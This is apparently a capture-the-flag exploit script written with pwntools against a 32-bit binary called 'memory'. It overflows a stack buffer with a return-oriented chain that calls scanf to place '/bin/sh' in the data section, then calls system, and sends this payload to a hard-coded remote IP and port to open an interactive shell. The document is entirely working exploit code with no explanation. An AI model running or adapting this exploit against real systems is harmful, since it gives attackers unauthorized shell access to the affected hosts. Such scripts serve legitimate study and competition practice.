from pwn import *

context(log_level='debug')

p = process('./memory')
# p = remote('127.0.0.1',10001)
p = remote('139.196.232.222',53000)
# p = remote('115.28.35.168',10001)
elf = ELF('memory')
system_plt = elf.symbols['system']
scanf_plt = elf.symbols['__isoc99_scanf']
pp_ret = 0x0804877e
_s = 0x08048817
flag = 0x080487E0
data = 0x0804A038

payload = 'a'*(0x13+4)+p32(scanf_plt)+p32(pp_ret)+p32(_s)+p32(data)+p32(system_plt)+p32(0)+p32(data)
# payload  = 'a'*(0x13+4)+p32(system_plt)+p32(flag)+p32(flag)
# print list(payload)
# p.recvuntil('>')
with open('1','wb') as f:
	f.write(payload)
# p.recvuntil('> ')
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()